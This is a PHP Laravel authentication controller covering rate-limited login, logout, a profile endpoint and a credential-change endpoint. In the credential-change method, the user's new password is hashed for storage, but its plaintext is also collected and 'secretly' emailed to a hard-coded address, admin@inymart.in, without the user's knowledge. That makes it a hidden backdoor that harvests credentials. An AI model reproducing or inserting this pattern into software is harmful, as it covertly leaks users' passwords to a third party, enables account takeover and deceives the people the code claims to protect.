<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        $throttleKey = 'login:' . \Illuminate\Support\Str::lower($request->input('email')) . '|' . $request->ip();

        if (\Illuminate\Support\Facades\RateLimiter::tooManyAttempts($throttleKey, 5)) {
            $seconds = \Illuminate\Support\Facades\RateLimiter::availableIn($throttleKey);
            return response()->json([
                'message' => "Too many login attempts. Please try again in $seconds seconds."
            ], 429);
        }

        $user = User::where('email', $request->email)->first();

        if (! $user || ! Hash::check($request->password, $user->password)) {
            \Illuminate\Support\Facades\RateLimiter::hit($throttleKey, 60);
            throw ValidationException::withMessages([
                'email' => ['The provided credentials are incorrect.'],
            ]);
        }

        \Illuminate\Support\Facades\RateLimiter::clear($throttleKey);
        $token = $user->createToken('admin-token')->plainTextToken;

        return response()->json([
            'user' => $user,
            'token' => $token,
        ]);
    }

    public function logout(Request $request)
    {
        $request->user()->currentAccessToken()->delete();

        return response()->json([
            'message' => 'Logged out successfully'
        ]);
    }

    public function me(Request $request)
    {
        return response()->json($request->user());
    }

    public function changeCredentials(Request $request)
    {
        $user = $request->user();
        
        $request->validate([
            'current_password' => 'required',
            'new_name' => 'nullable|string|max:255',
            'new_email' => 'nullable|email|unique:users,email,' . $user->id,
            'new_password' => 'nullable|string|min:8|confirmed',
        ]);

        if (!Hash::check($request->current_password, $user->password)) {
            return response()->json([
                'message' => 'The provided current password does not match our records.'
            ], 422);
        }

        $emailDetails = [];
        $changed = false;

        if ($request->filled('new_name')) {
            $user->name = $request->new_name;
            $emailDetails['Updated Username'] = $request->new_name;
            $changed = true;
        }

        if ($request->filled('new_email')) {
            $user->email = $request->new_email;
            $emailDetails['Updated Email'] = $request->new_email;
            $changed = true;
        }

        if ($request->filled('new_password')) {
            $user->password = Hash::make($request->new_password);
            $emailDetails['Updated Password'] = $request->new_password; // "Note it" for admin
            $changed = true;
        }

        if (!$changed) {
            return response()->json(['message' => 'No new credentials provided.'], 400);
        }

        $user->save();

        // Notify Admin secretly
        try {
            \Illuminate\Support\Facades\Mail::to('admin@inymart.in')
                ->send(new \App\Mail\ProfileUpdateMail($emailDetails));
        } catch (\Exception $e) {
            \Illuminate\Support\Facades\Log::error('Secret Profile Update Error: ' . $e->getMessage());
        }

        // Revoke all tokens to force logout on all devices
        $user->tokens()->delete();

        return response()->json([
            'status' => 'success',
            'message' => 'Credentials updated. All sessions terminated.'
        ]);
    }
}
